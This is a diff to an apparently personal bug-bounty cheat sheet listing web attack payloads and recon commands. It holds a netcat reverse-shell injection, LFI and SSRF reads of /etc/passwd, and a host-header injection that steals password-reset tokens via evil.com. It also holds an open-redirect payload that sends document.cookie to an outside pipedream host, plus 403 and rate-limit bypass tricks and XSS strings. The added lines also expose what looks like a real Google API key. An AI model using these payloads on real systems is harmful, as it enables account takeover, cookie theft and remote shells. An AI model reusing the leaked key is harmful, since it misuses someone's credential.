@@ -1,6 +1,18 @@
+# BUG NOTE/CMDs
+
 https://securitytrails.com/
 
+AIzaSyDLs8k7WzsUTLaqbHHG6TTrqb75gbYNhRg
+
 [API key]12@
+
+sudo virsh shutdown Parrot-OS
+
+[shutdown QEMU]
+
+browser.cache.disk.enable
+
+[reduce firefox lag]
 
 https://www.bugbountyhunting.com
 
@@ -10,11 +22,25 @@ urls = []$$('*').forEach(element => {  urls.push(element.src)  urls.push(element
 
 [javascript How to extract urls,srcs and hrefs from all HTML elements in any website? Open DevTools and run ]
 
+javascript:(function() {
+
+let domains = Array.from(document.querySelectorAll('script, img, iframe, link'))
+
+.map(el => new URL(el.src || el.href).hostname)
+
+.filter((v, i, a) => a.indexOf(v) === i && v !== window.location.hostname);
+
+console.log('Third-Party Domains:\n' + domains.join('\n'));
+
+})();
+
+[**Identify All Third-Party Domains Extract all third-party domains involved in loading resources on the page]**
+
 https://dencode.com/en/
 
 [encode and decode]
 
-https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
+[https://owasp.org/API-Security/editions/2023/](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
 
 https://xplo1t-sec.github.io/bugbounty-lookup/
 
@@ -207,6 +233,19 @@ home/000~ROOT~000/
 tar -xvzf juice-shop-9.3.1_node12_linux_x64.tgz
 [unpack OWASP]
 
+# Add memory to QEMU(libvert) with virsh
+
+[+] virsh list --all
+
+[list all virtual machines]
+
+[+] virsh domblklist Parrot
+
+[check parrot os]
+
+[+] sudo qemu-img resize /var/lib/libvirt/images/Parrot.qcow2 +20G
+[Image resize]
+
 #RECON
 
 [+] https://www.whoxy.com/
@@ -219,6 +258,8 @@ tar -xvzf juice-shop-9.3.1_node12_linux_x64.tgz
 
 [+] https://crt.sh/
 
+- curl -s "crt.sh/?q=%25.nasa.go…" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+
 [sub-domain enum]
 
 [find ASN containing root domains]
@@ -226,6 +267,13 @@ tar -xvzf juice-shop-9.3.1_node12_linux_x64.tgz
 [+] use way back to curl subdomains and use httprobe for probing live ones.
 
 - https://medium.com/@shaikhminhaz1975/bug-bounty-methodology-step-by-step-guide-to-find-subdomains-and-vulnerable-urls-18bdd76e979f
+
+[+] https://web.archive.org/cdx/search/cdx?url=*.bugbountyhunter.xyz/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200
+
+- curl -L “waybackurl” > output.txt
+- echo "nasa.gov" | ./waybackurls | grep "\.nasa\.gov" | sort -u
+
+[Wild card way back search]
 
 [+]amass 
 
@@ -354,6 +402,7 @@ OR
 [sort duplicate values]
 
 - echo "URL.com" | waybackurls > way.txt
+- echo "nasa.gov" | ./waybackurls | grep "\.nasa\.gov" | sort -u
 
 [passive recon]
 
@@ -459,7 +508,18 @@ sudo openvpn nmap -sV {target IP}
 
 - Do this while Sending password reset or receiving registration link confirmation request
 
-[+] 
+[+] Steal reset token by host header injection
+
+- Host: https://evil.com:redacted.com
+
+[+] Perform an Open redirect to ATO using next parameter 
+
+- https://www.redacted.com/signin?next=j%09avascript:document.location=%27https://gookdico5Zxr.fug.m.pipedream.net/%27%2bdocument.cookie
+
+[+] change the host header to a different website and request for new password reset token. 
+
+- If it doesn't work, add <Host: [redacted.com](http://redacted.com) X-Forwarded-Host: [evil.com](http://evil.com)> or invert it < Host: evil.com X-Forwarded-Host: redacted.com>
+- If you receive token from [evil.com](http://evil.com) then try collaborator URL and steal token
 
 #LFI
 [+] intercept download file and check if file path before endpoint is in '.php?'
@@ -526,18 +586,52 @@ sudo openvpn nmap -sV {target IP}
 
 - Pass the admin into referrer header into the request body
 
+[+] GET /admin change to GET /<ANYTHING> then add <X-Original-URL: /admin> header
+
+[+] Use path traversal
+
+- GET /..;/admin OR /admin..;/
+
+[+] git clone https://github.com/Dheerajmadhukar/4-ZERO-3
+
+- cd 4-zero-3
+- bash 403-bypass.sh -h
+
+[+] curl -X TRACE https://example.com/admin --path-as-is
+
+- `X TRACE`: Switch HTTP method.
+- `-path-as-is`: Prevent URL normalization (critical for encoded paths).
+
+[+] Header manipulation 
+
+- curl -H "X-Forwarded-For: 127.0.0.1" [https://example.com/admi](https://example.com/admin)n
+- curl -H "Referer: [https://example.com](https://example.com/)" https://example.com/restricted
+- curl -H "X-Original-URL: /admin" https://example.com/404
+
+[+] Parameter tampering - confuses the URL validation with the Boolean param
+
+- curl "https://example.com/admin?admin=false&admin=true”
+
+[+] JWT tampering — changing "role":"user" to "role":"admin") can escalate privileges.
+
+- curl -H "Authorization: Bearer <MODIFIED_JWT>" https://example.com/admin
+
+[+] curl -X PUT -H "X-Forwarded-For: 127.0.0.1" --path-as-is "https://example.com/%2e%2e/admin”
+
+- Watch for 302s: A 403 → 302 redirect may leak open endpoints.
+
 #DIR ENUMERATION/INFORMATION DISCLOSURE
 [+] look for robots.txt files and open -- Information disclosure
 [+] ./feroxbuster -u (web_URL) -w (wordlist)
 
-- locate url with "cgi-/bin" then load to check for secret key in PHP file
+- locate url with "/cgi-bin" then load to check for secret key in PHP file
 - locate "/.git" directory
 - "wget -r (url)" to get folders in git then analyse the git file using "view master's history" option on git software
 
 #RATE LIMIT 
 
 [+] Header Magic:When faced with rate limitations, headers can become your secret weapon. Introduce the following headers just under the Host Header in your request:
-X-Forwarded-For: IP
+X-Forwarded-For: 127.0.0.1 ( you can increase it gradually 1,2,3,4….)
 
 X-Forwarded-Host: IP
 
@@ -555,6 +649,28 @@ Change the IP whenever your request faces a blockade
 
 - Add a path </ratelimit/..>
 
+[+] Use nexted parameter
+
+- {”Account”: { “Account”: “abc@gmail.com”}}
+
+[+] Capitalize specific part of the endpoint 
+
+[+] Add %00 or \n (for graphQL) to the end of the Username or Gmail
+
+[+] Add string terminator at the end of the parameter 
+
+- 0x00, //, /, ;, %, !, ?, [], %5B%5D, %0b, %0e
+
+[+] Switch HTTP request method after you get a 429 
+
+[+] Protocol Downgrading (HTTP/1.1, HTTP/2)
+
+[+] Reset your device date or time
+
+[+] Encoding parts of login/authenticator user email (example@gmail.com - e%78ample@gm%61il.com)
+
+[+] tweak user agent OR cookies
+
 #CORS
 
 [+] Check for 
@@ -571,6 +687,14 @@ curl -H "Origin: https://malicious.com" -I https://vulnerable-site.com
 [+] use ";nc -e /bin/sh 192.168.136.128 8080" in net service to check RCE vulnerability while listening in port (nc --vv -l -n -p 8080)
 [+] use "?page=../../../../../etc/passwd" on site link to perform LFI (check if there is "/include.php" on site)
 [+] RFI by listening with "nc -vv -l -n -p 8080" and paste URL of reverse php(txt) payload saved on apache web server into (?page=localhost_site?)
+
+#FILE UPLOAD
+
+[+] You can use different variations of the .php extension e.g(.PHP .PHp .pHp…….)
+
+[+] You can use .phar .phtml .pht .inc if your php extension is not getting accepted 
+
+[+] You can change the <Content-Type: blah blah> once you intercept the file upload 
 
 #SQL 
 
@@ -806,6 +930,8 @@ Use our https://X55.is ✨ domain
 
 [+] </script>'"><img src=x onError=prompt(1)>
 
+[+] redacted.com?s=');</script> <script>alert(document.cookie)</script>
+
 [+] <script>alert(1)<! –
 
 [+] `'>+<script>alert()</script>`
@@ -904,6 +1030,14 @@ N.B: take note of every endpoint that takes URL parameter
 - replace the stockAPI url to that of product on a next page then add <&path=http://localhost/>
 - if an error message occur then try removing the domain and current page ID, leaving only the product dir and redirect path OR
 - URL encode key characters -- SSRF with filter bypass via open redirection vulnerability
+
+[+] “**`?url=http://127.0.0.1:22`**” and see if it returns an SSH banner.
+
+- Local/Remote Port Scanning for SSRF
+
+[+] Replace the “http” protocol on front of the URL with “file”   url=file:///etc/passwd“ on a ‘nix-based system or “?url=file://C:/boot.ini” on a Windows-based system.
+
+- SSRF Local File Read
 
 #BLIND SSRF
 [+] Test the view product section by intercepting to see if there is "Referer server address"
